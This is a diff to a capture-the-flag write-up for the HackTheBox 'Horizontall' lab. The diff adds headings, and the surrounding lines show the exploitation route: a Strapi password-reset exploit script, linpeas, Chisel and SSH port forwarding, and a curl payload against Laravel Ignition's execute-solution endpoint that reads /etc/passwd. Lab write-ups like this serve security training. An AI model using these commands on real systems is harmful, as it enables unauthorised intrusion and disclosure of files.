@@ -84,6 +84,7 @@ searchsploit -m multiple/webapps/50239.py
 
 Object injection via ResetPassword parameter.
 
+## Exploit
 ```bash
 python3 50239.py http://api-prod.horizontall.htb
 # [+] Password reset was successfully
@@ -102,6 +103,7 @@ Reverse shell commonly fail maybe also because of bad characters, we can get aro
 
 **user flag**: `HTB{2dd8275a0606fd1eba918466557XXXXX}`
 
+## Privileged Escalation
 ```bash
 ./linpeas.sh
 
@@ -169,6 +171,7 @@ PORT     STATE SERVICE
 curl localhost:8000 # web server here!, let's port forwarding
 ```
 
+### Port Forwading
 **Using Chisel**:
 ```bash
 # kali machine
@@ -192,6 +195,7 @@ ssh -i id_rsa strapi@horizontall.htb -L 34567:127.0.0.1:8000
 > -L 8001:127.0.0.1:8000
 ```
 
+### Exploit again
 Google search `Laravel v8 (PHP v7.4.18)` --> debug mode to RCE --> https://esmyl.medium.com/exploiting-laravel-v8-30-0-php-v7-3-25-debug-rce-3731f69c33d7
 ```bash
 curl -d '{"solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution", "parameters": {"variableName": "test", "viewFile": "/etc/passwd%00"}}' -H 'Content-Type: application/json' http://127.0.0.1:34567/_ignition/execute-solution | grep failed
